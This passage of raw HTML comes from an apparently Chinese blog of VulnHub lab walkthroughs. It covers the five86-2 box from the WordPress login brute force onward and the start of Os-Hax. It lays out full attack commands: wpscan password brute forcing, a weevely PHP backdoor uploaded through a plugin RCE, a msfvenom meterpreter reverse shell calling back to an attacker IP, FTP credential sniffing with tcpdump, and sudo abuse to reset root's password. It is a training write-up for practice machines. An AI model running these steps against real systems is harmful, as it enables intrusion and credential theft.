http:&#x2F;&#x2F;192.168.31.51&#x2F;server-status (CODE:403|SIZE:278)                                     </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-admin&#x2F;                                                </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-content&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-includes&#x2F;                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;xmlrpc.php (CODE:405|SIZE:42)</span><br></pre></td></tr></table></figure><ul><li>80端口上仅存在Wordpress服务框架</li></ul><h2 id="漏洞利用-10"><a class="markdownIt-Anchor" href="#漏洞利用-10"></a> 漏洞利用</h2><ul><li>未找到FTP服务版本相关漏洞</li><li>Wordpress深入信息收集</li><li>未挖掘出有漏洞的插件或主题</li><li>用户枚举</li></ul><p><code>wpscan --url http://192.168.31.51/ -e u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] barney</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] gillian</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] peter</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] stephen</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>构造用户字典文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line"></span><br><span class="line">barney</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">peter</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure><p>尝试进行账户爆破</p><p><code>wpscan --url http://192.168.31.51/ -U user -P /usr/share/wordlists/rockyou.txt</code></p><p>得到两个账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">barney spooky1</span><br><span class="line">stephen apollo1</span><br></pre></td></tr></table></figure><p>在<code>/wp-login.php</code>登入</p><p>登入之后在<code>Plugins</code>面板看到存在插件</p><p><code>Insert or Embed Articulate Content into WordPress Trial</code></p><p>搜索相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Insert or Embed Articulate Content into WordPress</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;46981.txt</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>再查看漏洞的具体利用步骤<br /><code>cat /usr/share/exploitdb/exploits/php/webapps/46981.txt</code></p><ol><li>使用weevely构造php后门并创建一个文件index.html，压缩成zip文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass &gt; shell.php</span><br><span class="line">echo &gt; index.html</span><br><span class="line">zip poc.zip index.html shell.php</span><br></pre></td></tr></table></figure><ol start="2"><li>登入wordpress(已登入)</li><li>依次点击<code>Posts -&gt; Add New -&gt; Add block -&gt; e-Learning -&gt; UPLOAD -&gt; CHOOES YOUR ZIP FILE -&gt; poc.zip -&gt; UPLOAD! -&gt; Insert As: iFrame -&gt; INSERT</code></li><li>此时会显示出index.html的路径，复制之后将index.html改为shell.php即为后门路径</li><li>连接后门<br /><code>weevely http://five86-2/wp-content/uploads/articulate_uploads/poc/shell.php pass</code></li></ol><h2 id="权限提升-10"><a class="markdownIt-Anchor" href="#权限提升-10"></a> 权限提升</h2><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux five86-2 5.3.0-26-generic #28-Ubuntu SMP Wed Dec 18 05:37:46 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造meterpreter后门程序</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9990 -f elf &gt; msf.elf</code></p><p>在MSF中开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9990</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在weevely中上传后门程序并启动(需要填写绝对路径)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;msf.elf</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">chmod +x msf.elf</span><br><span class="line">.&#x2F;msf.elf</span><br></pre></td></tr></table></figure><p>在meterpreter的shell中获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看文件<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">barney:x:1001:1001:Barney Sumner:&#x2F;home&#x2F;barney:&#x2F;bin&#x2F;bash</span><br><span class="line">stephen:x:1002:1002:Stephen Morris:&#x2F;home&#x2F;stephen:&#x2F;bin&#x2F;bash</span><br><span class="line">peter:x:1003:1003:Peter Hook:&#x2F;home&#x2F;peter:&#x2F;bin&#x2F;bash</span><br><span class="line">gillian:x:1004:1004:Gillian Gilbert:&#x2F;home&#x2F;gillian:&#x2F;bin&#x2F;bash</span><br><span class="line">richard:x:1005:1005:Richard Starkey:&#x2F;home&#x2F;richard:&#x2F;bin&#x2F;bash</span><br><span class="line">paul:x:1006:1006:Paul McCartney:&#x2F;home&#x2F;paul:&#x2F;bin&#x2F;bash</span><br><span class="line">john:x:1007:1007:John Lennon:&#x2F;home&#x2F;john:&#x2F;bin&#x2F;bash</span><br><span class="line">george:x:1008:1008:George Harrison:&#x2F;home&#x2F;george:&#x2F;bin&#x2F;bash</span><br><span class="line">dnsmasq:x:114:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>存在用户<code>barney</code>和<code>stephen</code><br />尝试套用Wordpress账户的密码<br />可以登入账户stephen</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">apollo1</span><br></pre></td></tr></table></figure><p>查看当前用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;1002(stephen) gid&#x3D;1002(stephen) groups&#x3D;1002(stephen),1009(pcap)</span><br></pre></td></tr></table></figure><p>查看特权命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getcap -r &#x2F; 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;tcpdump &#x3D; cap_net_admin,cap_net_raw+eip</span><br></pre></td></tr></table></figure><p>发现存在tcpdump程序，可以用于监听流量</p><p>查看程序tcpdump所有者与所有组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;usr&#x2F;sbin&#x2F;tcpdump</span><br><span class="line">-rwxr-x--- 1 root pcap 1044232 Oct 11 18:48 &#x2F;usr&#x2F;sbin&#x2F;tcpdump</span><br></pre></td></tr></table></figure><p>而用户stephen也属于pcap组，可以使用tcpdump程序</p><p>查看系统关于ftp的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep ftp</span><br><span class="line"></span><br><span class="line">systemd+  1251  0.0  0.3 119976  1876 pts&#x2F;0    Ss+  10:21   0:01 proftpd: (accepting connections)</span><br><span class="line">paul      2329  0.0  0.1   2600   788 ?        Ss   12:00   0:00 &#x2F;bin&#x2F;sh -c &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">paul      2330  0.0  0.1   2600   788 ?        S    12:00   0:00 &#x2F;bin&#x2F;sh &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh</span><br><span class="line">paul      2331  0.0  0.4   3224  2124 ?        S    12:00   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2332  0.0  1.2 133072  6124 pts&#x2F;0    S+   12:00   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2335  0.0  0.1   6496   856 pts&#x2F;0    S+   12:01   0:00 grep ftp</span><br></pre></td></tr></table></figure><p>用户paul正在执行脚本<code>ftp_upload.sh</code>和命令<code>ftp -n 172.18.0.10</code><br />而FTP是明文传输，可以通过监听流量来获取一些信息</p><p>查看网络接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line"></span><br><span class="line">1.br-eca3858d86bf [Up, Running]</span><br><span class="line">2.eth0 [Up, Running]</span><br><span class="line">3.vethf7d5e2c [Up, Running]</span><br><span class="line">4.lo [Up, Running, Loopback]</span><br><span class="line">5.any (Pseudo-device that captures on all interfaces) [Up, Running]</span><br><span class="line">6.docker0 [Up]</span><br><span class="line">7.nflog (Linux netfilter log (NFLOG) interface) [none]</span><br><span class="line">8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]</span><br></pre></td></tr></table></figure><p>监听流量一分钟</p><p><code>timeout 60 tcpdump -i vethf7d5e2c -w /tmp/cap.pcap</code></p><p>查看流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -r &#x2F;tmp&#x2F;cap.pcap</span><br><span class="line"></span><br><span class="line">12:12:05.337100 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 1:58, ack 1, win 1019, options [nop,nop,TS val 1753001473 ecr 956298429], length 57: FTP: 220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]</span><br><span class="line">12:12:05.337126 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 0</span><br><span class="line">12:12:05.337305 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 11: FTP: USER paul</span><br><span class="line">12:12:05.337311 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [.], ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 0</span><br><span class="line">12:12:05.337522 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 58:90, ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 32: FTP: 331 Password required for paul</span><br><span class="line">12:12:05.337610 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 0</span><br><span class="line">12:12:05.337627 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 12:33, ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 21: FTP: PASS esomepasswford</span><br></pre></td></tr></table></figure><p>得到账户<code>paul:esomepasswford</code></p><p>切换至账户paul</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su paul</span><br><span class="line">esomepasswford</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;service</span><br></pre></td></tr></table></figure><p>可以以用户peter的权限去执行<code>/usr/sbin/service</code><br />即可以通过该命令切换至账户peter<br /><code>sudo -u peter /usr/sbin/service ../../bin/bash</code></p><p>查看该用户sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;passwd</span><br></pre></td></tr></table></figure><p>即可用passwd命令修改root账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root passwd root</span><br><span class="line">hackforfun</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p>切换至root账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>HTTP爆破</p></blockquote><p>我在自己尝试了弱口令字典失败后再想了一下别的方向，无果后去看其他大神的WP，发现需要用rockyou.txt，本地测试跑完这个字典需要数十个小时<br />这一步的话可能换一个简单点的口令或者放一个LFI漏洞去读passwd然后爆破hash就更恰当点</p><blockquote><p>FTP流量劫持</p></blockquote><p>做到流量劫持这一步整个人完全懵了，没想到是怎么看出来后台有FTP传输任务，顺着其他大神的思路打通之后浏览了下那个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat ftp_upload.sh</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">HOST&#x3D;&#39;172.18.0.10&#39;</span><br><span class="line">USER&#x3D;&#39;paul&#39;</span><br><span class="line">PASSWD&#x3D;&#39;esomepasswford&#39;</span><br><span class="line">FILE&#x3D;&#39;file.txt&#39;</span><br><span class="line"></span><br><span class="line">ftp -n $HOST &lt;&lt;END_SCRIPT</span><br><span class="line">quote USER $USER</span><br><span class="line">quote PASS $PASSWD</span><br><span class="line">binary</span><br><span class="line">put $FILE</span><br><span class="line">quit</span><br><span class="line">END_SCRIPT</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p>大意应该是持续用ftp命令上传文件file.txt<br />所以在用命令<code>ps -aux | grep ftp</code>是会看到paul在执行<code>ftp -n 172.18.0.10</code></p><blockquote><p>为什么是网络接口vethf7d5e2c而不是br-eca3858d86bf</p></blockquote><p>本地操作时接口br-eca3858d86bf的ip是172.18.0.1，而vethf7d5e2c没有ipv4地址<br />实际操作时只能尝试监听所有可能的网卡</p><blockquote><p>capabilities 关于linux特权</p></blockquote><p>在系统的角度检测非root用户进行特权操作时，该命令所需的权限与被赋予的权限是否相符<br /><code>getcap -r / 2&gt;/dev/null</code></p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/sparkdev/p/11417781.html">capabilities</a><br /><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities manual page</a><br /><a href="http://www.liuwx.cn/Vulnhub-five86-2.html#tcpdump%E6%8B%A6%E6%88%AA%E7%BD%91%E5%8D%A1%E6%B5%81%E9%87%8F%E8%8E%B7%E5%8F%96FTP%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81">WP</a></p></blockquote><hr /><h1 id="os-hax"><a class="markdownIt-Anchor" href="#os-hax"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hax,389/">Os-Hax</a></h1><p><code>2020/03/17 20:53:03</code></p><h2 id="端口扫描-11"><a class="markdownIt-Anchor" href="#端口扫描-11"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.36</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.36</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)</span><br><span class="line">|   256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)</span><br><span class="line">|_  256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Hacker_James</span><br><span class="line">MAC Address: 08:00:27:0D:02:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.070 days (since Tue Mar 17 06:51:52 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-11"><a class="markdownIt-Anchor" href="#web路径枚举-11"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.36/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.36&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: 